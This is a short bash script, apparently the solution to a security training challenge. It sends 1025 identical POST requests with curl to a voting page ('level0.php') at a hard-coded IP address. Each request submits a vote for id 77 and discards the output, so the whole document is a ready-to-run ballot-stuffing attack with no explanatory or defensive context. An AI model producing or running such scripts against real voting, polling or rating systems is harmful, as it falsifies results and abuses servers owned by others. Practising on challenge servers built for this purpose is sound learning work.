#!/bin/bash
for i in {0..1024}
do
    curl "http://54.221.6.249/level0.php" -X POST -d "id=77&holdthedoor=submit" > /dev/null 2>&1
done
